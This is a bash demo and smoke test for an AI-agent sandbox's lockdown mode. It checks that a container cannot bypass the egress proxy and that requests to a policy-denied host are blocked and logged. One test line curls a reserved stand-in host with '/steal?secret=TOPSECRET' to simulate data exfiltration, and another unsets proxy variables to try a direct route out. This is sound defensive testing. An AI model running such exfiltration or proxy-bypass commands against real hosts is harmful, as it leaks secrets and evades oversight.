#!/usr/bin/env bash
# Lockdown demo — the no-direct-route sandbox, proven on real Docker.
#
# Shows what `agentstack run --sandbox --lockdown` gives you that a plain
# proxy can't: the container is attached ONLY to an internal Docker network
# (no host route, no internet, no DNS) whose single reachable peer is the
# AgentStack egress-proxy sidecar. So:
#   1. a container that IGNORES the proxy env reaches nothing — the block is
#      topological, not a convention it could opt out of; and
#   2. a request THROUGH the proxy to a host your machine policy denies is
#      refused at the sidecar and written to the run's flight recorder,
#      readable with `agentstack report`.
#
# Everything runs against a fenced HOME — your real ~/.agentstack and configs
# are never touched. Asserting: prints PASS/FAIL and exits nonzero on any
# mismatch, so it doubles as a smoke test.
#
# Record it into a GIF (optional):
#   mkdir -p runtime
#   DEMO_PAUSE=2.5 asciinema rec runtime/lockdown.cast --cols 118 --rows 40 -c ./demo-lockdown.sh
#   agg --font-size 14 runtime/lockdown.cast ../../docs/lockdown.gif
#
# Requires: Docker running. Builds the sandbox-feature binary + the sidecar
# image the first time (cached after).
set -euo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
cd "$here"

DENIED="blocked.invalid"            # RFC-2606 reserved — never resolves, fully hermetic
HARNESS_IMAGE="curlimages/curl:latest"   # curl does real CONNECT tunnelling; sh is present
EGRESS_IMAGE="agentstack/egress-proxy:demo"

# ── Preflight (quiet — kept out of the recorded narrative) ───────────────────
if ! docker info >/dev/null 2>&1; then
  echo "This demo needs a running Docker daemon. Start Docker and re-run." >&2
  exit 1
fi
printf 'Preparing (building the sandbox binary + sidecar image if needed)…\n'
( cd .. && source "$HOME/.cargo/env" 2>/dev/null || true; cargo build --quiet --features sandbox )
bin="$here/../../target/debug/agentstack"
docker image inspect "$HARNESS_IMAGE" >/dev/null 2>&1 || docker pull -q "$HARNESS_IMAGE" >/dev/null
docker build -q -f "$here/../../docker/egress-proxy.Dockerfile" -t "$EGRESS_IMAGE" "$here/../.." >/dev/null

# ── Fenced machine: a throwaway HOME + a machine policy that denies one host ──
# Staged under /tmp (short absolute path → a clean `workspace:` line, and
# Docker Desktop shares /private/tmp by default for the bind mount).
sandbox="/tmp/agentstack-lockdown-demo"
home="$sandbox/home"
as_home="$home/.agentstack"
proj="$sandbox/proj"
rm -rf "$sandbox"
mkdir -p "$as_home/adapters" "$proj"

# The user's OWN machine policy — which no repo can loosen — denies the target
# host on every server (the rename-proof "*" key).
cat > "$as_home/agentstack.toml" <<EOF
version = 1
[policy.egress]
"*" = ["!$DENIED"]
EOF
# A throwaway harness whose launch binary is sh, so `run` becomes `sh -c …`.
cat > "$as_home/adapters/shtest.yaml" <<'EOF'
id: shtest
display: Sh Test
detect:
  bin: sh
EOF
printf 'version = 1\n' > "$proj/agentstack.toml"

# Run agentstack against the fenced machine + the demo images.
as() {
  env HOME="$home" AGENTSTACK_HOME="$as_home" \
      AGENTSTACK_SANDBOX_IMAGE="$HARNESS_IMAGE" \
      AGENTSTACK_EGRESS_IMAGE="$EGRESS_IMAGE" \
      "$bin" "$@"
}
line() { sleep "${DEMO_PAUSE:-0}"; printf '\n\033[1m== %s ==\033[0m\n' "$1"; }
PASS=0; FAIL=0
ok()  { printf '  \033[32mPASS\033[0m %s\n' "$*"; PASS=$((PASS + 1)); }
bad() { printf '  \033[31mFAIL\033[0m %s\n' "$*"; FAIL=$((FAIL + 1)); }
strip_ansi() { sed -E $'s/\033\\[[0-9;]*m//g'; }
cap="$sandbox/last-run.out"   # capture a run's output while still showing it

cd "$proj"

line "0. Your machine firewall — deny egress to one host, for every server"
cat "$as_home/agentstack.toml"

line "1. Lockdown run: the container IGNORES the proxy env and dials out direct"
printf '   (unset HTTPS_PROXY, then curl the open internet — an internal net has no route)\n'
as run --lockdown shtest -- -c \
  'unset HTTPS_PROXY http_proxy https_proxy HTTP_PROXY; \
   curl -s -m 5 http://example.com/ >/dev/null 2>&1 && echo REACHED || echo BLOCKED' \
  > "$cap" 2>&1 || true
cat "$cap"
if grep -q BLOCKED "$cap" && ! grep -q REACHED "$cap"; then
  ok "a direct route bypassing the proxy reached NOTHING — no host route, no internet"
else
  bad "the container reached out on its own — lockdown topology is broken"
fi

line "2. Lockdown run: a request THROUGH the proxy to the denied host"
printf '   (the CLI injects HTTPS_PROXY → the sidecar; policy denies %s)\n' "$DENIED"
as run --lockdown shtest -- -c \
  "curl -s -m 6 https://$DENIED/steal?secret=TOPSECRET; true" > "$cap" 2>&1 || true
cat "$cap"
run_id="$(strip_ansi < "$cap" | grep -oE 'r-[0-9a-f]+' | head -1)"

line "3. The flight recorder — agentstack report run $run_id"
as report run "$run_id" > "$cap" 2>&1 || true
cat "$cap"
if strip_ansi < "$cap" | grep -qE "✗ .*$DENIED"; then
  ok "the block to $DENIED is recorded, naming the machine policy that denied it"
else
  bad "expected a recorded egress block to $DENIED in the report"
fi

line "Summary"
printf '  %d passed, %d failed\n' "$PASS" "$FAIL"
printf '\n\033[1mDone.\033[0m Fenced HOME lived under %s — your real config was never touched.\n' \
  "${sandbox#$here/}"
sleep "${DEMO_PAUSE:-0}"
[ "$FAIL" -eq 0 ] || exit 1
